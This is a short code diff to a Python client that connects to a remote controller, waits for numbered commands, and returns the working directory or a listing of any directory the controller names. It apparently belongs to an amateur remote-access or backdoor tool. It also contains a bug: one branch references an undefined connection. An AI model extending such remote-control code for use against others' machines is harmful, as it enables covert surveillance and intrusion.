@@ -13,10 +13,23 @@ while 1:
     command = s.recv(1040)
     command = command.decode()
     print("command recived")
-    if command == "view_cwd":
+    if command == "1":
         files = os.getcwd()
         files = str(files)
         s.send(files.encode())
         print("command executed* ")
+
+    elif command == "2":
+        userInput = s.recv(5000)
+        userInput = userInput.decode()
+        files = os.listdir(userInput)
+        files = str(files)
+        s.send(files.encode())
+        print("cus dir sent done* ")
+
+    elif command == "3":
+        conn.send(command.encode())
+        print("")
+
     else:
         print("Command not recongnised")
